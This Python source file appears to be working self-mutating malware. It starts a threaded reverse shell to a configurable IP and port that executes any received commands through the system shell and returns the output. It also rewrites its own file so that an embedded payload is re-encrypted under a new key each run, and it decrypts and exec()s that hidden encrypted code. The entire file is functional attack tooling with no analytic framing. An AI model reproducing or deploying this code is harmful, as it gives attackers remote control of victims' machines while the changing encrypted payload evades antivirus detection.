import os
import socket
import subprocess
import sys
from cryptography.fernet import Fernet
import threading


def decrypt(token, key):
    fer = Fernet(key)
    decrypted_token = fer.decrypt(token).decode()
    exec(decrypted_token)


# For reverse shell
IP = "127.0.0.1"  # localhost
PORT = "1234"

# START
key = "oP30m_E1mU83mpPMSlFWEFHX6oRoZ3HzoPQMIHTTjlY="
token = "gAAAAABmy2mSmN9zV4nDfvJ6qjpkVDrjyWws7QfCs2s56CYBpMxMT6mKh7D92E9P8j9TvBPvtTZBNP3C0-agZ-fagx6KLCe1qhFjLS7HBwqfHdw-qOh3Vgdyt1Q9aufat6d7hLLm2f8QksB95qdgWQ-EtBSxWVekDjAKLh9s6p8Lx_-q1SqnclRE_ZQON7bL9if5Pt_oiL5JxJDoKcix2h4T_M1w65cW_2N0JcLxkBgsqI0Ujl-KGcbi7fpTlHRJ4ujfRAcTE729IhtuPpS9qO630fWYTcGlVhfErMqHvJLAE3mUwR7OJOBzaL0daF0TeVHGuRs6k1FGMC4a5kS6XE-WZ5c2Psl3vUA7r48XlirTbEdsh3CwVm3aTQF7Ook4PMPMf-BiiNy6qvmwD1kVNJl6cHwCfb98FBONP2FUP9csv0TjqylXQ-0__LgPQtMmfPFr68gek1pDw0zaY4AotuJNuzJZ4L6vX7YE6odDJvi-H73YFmXOeKBiC3DdKLIfdYrRF6m0ZBmfWbK1wTFkF588x4YH97OJdamC_jXfC4FZ0mqal6--uh1cGHOTsvnv5bKnLN2zt4QUziZtIPa-mUUuNlARmxO8liOmC-okmAPEdrNGCBr9utDCVF0z4t0ZNSynxZlsu40hYp4zGEfMvRXassfCygENV6vEWQWMzOFky2UvAHcV8-TiENX77LiX86lfhT3J4zcQiVu1I_66FFxq83Q1Pj2tRYjxaN4veKkbNN-Am5Vg4oOR6yUKAwlniD7mggojmAEuqj3LXkXEOLRZLyNZIrfY8GNcvQ2Uh2Xiqcr6Mdo4LFhtiMRMEDup_C-GhR1ZKX2jw-J2pbbPkjKaA2YO3DjMBMRL1kiA0hIxyq-_qtVjkrNUeNHERODARxbt6HbARQUWWNrxXroEf3757WS--btqAFHhd7NBD6_p-mMScRbLLk_0eeme5iJ1KfOQYwzKQ4zvMtAkw7SLv0ebs7F2CI29N-VZW_u2nV8hy4ZYd6vFhDfjxQMd_CV8Aaghn2gyhqPkAvJdOqJJnl7Nt6NQdOzaQgvtqY0NtETFOQjnhh94qbaI-Pn73taFMoCHfUdUJp8mipp4bMzMLCmHRc8YAkRkWkUotbk0DCg8cPr4FpknSm19JRx5SmBrMYTvPqf6F7eLmOQM3iBjUYb_oIPOL2Hr394seRSpRDDPUqFZEfoFuQmi8NMj1dmgfcQj6QymBVhZ6sBSxekDcBijZfGKoh3rYxSqXCsnERrYn-nrke0T9zKZoHBQuXuvWMZPM53fWbcqNRqJWJmSp-g21PMpzeWEXhpkHb37sZNjosyTKEMfSySyKwV9qnSgdWQXnPNlYP9cWBRSW_qg7X9gYFTvgsJF_pzFPcjbcpVRll2r7KnM3K4b4mYoQ6yHldYipk6TWjWtKnvCo2gDt9XoB-H1VnPyc1GA6ldeZgg2PcLl_pvzGOI1qzBL3F3r--KXaDT6aSTXjNn7ofT_vQkWTM8NwOe_PAtN-RbtS2BD16ljZRs_psXH4_zUah5c2IHilwztmjhuRlm2LUkZ_MXlxXl-zkSIm622DE9mgXD0vrgCZTJi4L16RRc-GxNM2vOHjPNX_vRehd--ppuWtHrMdLtz9D_gXSl-Xv5t_8d_PxAzELDp78-k2uic_XOqwNyutQNWCK_V7JG_Xr0nZAjvXO9tfzwiLobxI9KmDEmHyefwj69nVW7I2nONiwNRzlJj4EN9eenXkCDeruJltOMgShPcBDzqzLJ-rDd4U013hRh9FyR4FLcs-IUuaSX3RP1_iltJeetzIswlzah3gDSiiBgmCcZJDC4UI2Uf_2T8lDMKKMyW1LOAKCQzpgmZxStpT8011OGNRh0BkwJ0ad5oPPsh1VaJuIAFOV1duxKMsiy4CS2N3VMZ3VEtqI4PeLIh4ngSGbUK5jswyob5H85wc3JKw4l_zDX0m-m4e5LNknrpxFbsGYk1-kUFsCT17-k9Rx-p1xgCd1tEC_CsrXh-7gc07dKNZxbTLsF0EMcnoTBzg4PqGWclYhqKqvkNEi2RoLiro-koyXWaRzAydFu-6Kp3r95-zBXRufyJVYujwTqxMQMUr82FDhcXXstFeqBpDuyay6CmpgolcZ8rqqsHHn_OMPjh8se5eP9TqAE3iAGRwIQRDMQyHvjbQe2TsBopehbtAdvOONkiIGBgu4PMQz30H7dWyoeT5oWILVW3IHR6mwzX2mO5nwNHOJdugaX3PSNQyeOFprxuN5_J4d3jtjNRCB7yj7aBXFv9TpZxWJ0khElhtSsS6OF90xIa9impe_YUGWDJZBSxnpLfmGxC_Xf-aw8Ia2AjYxUiFdM4wRR7jwHu_nT5A9fmk7PnEUsmIhUVZWENmhMfuxQoXhS12dm3xyC49GHSJg8pCotYaqjEBg2aaPmDa0Su87GDpP4Pqzt_xnkbkmSEy7W_P13OTjo0B_63wEj9GzlfxtYfeJr4-O9V-5M_jiqTtzkFDE1nnm5iaqIth0DLrVoMqThJ-YHTA9lxnENOEn3bUPIIBVMBulbMf20eBSQz2l7LjSuz7Dy6xybVkr9KS3Pw4FcIn_o0S-1nre7JuoRXcCSoasOXI_vN-fvIJz88VElMZMYoFlrB6UiSXdESJj00aZmCc6ysydaCcVv2oQN74ih0xXQwHsht5OMY3pxD38my9lLj4TObIgsY4vCoFJttDgzz2R9mifS8hnn2fJxUjxOh5E5j5f6i41Ci17agU2s6qA2X5m-DRymBb5S-XKaC79O6RA0q7MdL2lmqLdhF_dI6My0kSR57KnTHTMG1M5rC6gEaFX8M4xHplwpbVyDHJyj3nCvT-NvHgBeW9px67GMe-8VQttf73RUH3d3RHXhwifhiSscA8uKJv9tAQJHH06zmYbsLm8UWJsAFQ9aTEDrPgKLgvcqXWiNJAyvMHi8BUCKg4W06lHRNdxpigUYGcOdyHbqtP54mnW-sT9Ti9bIF8EjFz1gcCn8HHwLEUUVApoje4Aim6OOmJVrlcYK3xCKStMjI3iUt27QwoF_ufnu4nva44c4iuyxTWZmOO7EzfWL-Y0-UWGahsbhk_WMGGd8a2ATT0DMV53Fxwc7oWF8EvVTFyOUCVLcEoqxMR4v744ZlZZTzgMm17wEeUp-vp1GtVC0v13qNkgLhGZr0gZABehVYdDXFp9RaexAQfPojhwvDOfUWjMwL-22nPqX1FZ5pqMO90mE6ixazONvDt9voFvdSwYMtrfQvvzVHAyisNqI9hYaC7UAjY7RJooyl0DQ9TodBNTUWs686hIfDYPQN_v-ZxQEL_tsf1-odd6glXpHJS6NaEzldlQXhL_0iPQrrbhx0Qd_Wtch9BL5H5QMyyToLlAvDwaWCTyhG7iBHWXRX7avxfsMR"


def run():
    def reverse_shell():
        global IP
        global PORT
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, PORT))
            s.send(b"[*] Connection Established!\n")  # Send as bytes
        except Exception as e:
            print(str(e))
            sys.exit(1)

        while True:
            try:
                s.send(os.getcwd().encode("utf-8") + b"> ")  # Send current directory
                data = s.recv(1024)  # Receive data as bytes
                if data == b"quit\n":  # Check for 'quit' command
                    break
                if data[:2] == b"cd":  # Check for 'cd' command
                    try:
                        os.chdir(data[3:].decode("utf-8").strip())  # Change directory
                        s.send(
                            b"Changed directory to "
                            + os.getcwd().encode("utf-8")
                            + b"\n"
                        )
                    except Exception as e:
                        s.send(str(e).encode("utf-8") + b"\n")
                    continue

                if len(data) > 0:
                    proc = subprocess.Popen(
                        data.decode("utf-8", errors="ignore").strip(),
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                    )
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    s.send(stdout_value)  # Send the command output
            except Exception as e:
                s.send(str(e).encode("utf-8") + b"\n")
                break

        s.close()

    # run the reverse shell in a separate thread
    try:
        reverse_shell_thread = threading.Thread(target=reverse_shell)
        reverse_shell_thread.start()
    except Exception as e:
        print(str(e))

    file_name = os.path.basename(__file__)
    lines = []
    with open(file_name, "r") as f:
        lines = f.readlines()
    with open("tmp", "w") as f:
        for line in lines:
            if line == "# START\n":
                break
            f.write(line)

        f.write("# START\n")

        global key
        global token

        fer = Fernet(key)
        decrypted_token = fer.decrypt(token).decode()

        key = Fernet.generate_key()
        fer = Fernet(key)
        token = fer.encrypt(decrypted_token.encode())

        f.write(f'key = "{key.decode()}"\n')
        f.write(f'token = "{token.decode()}"\n')
        f.write("\ndecrypt(token, key)\n")

    os.remove(file_name)
    os.rename("tmp", file_name)


run()

decrypt(token, key)
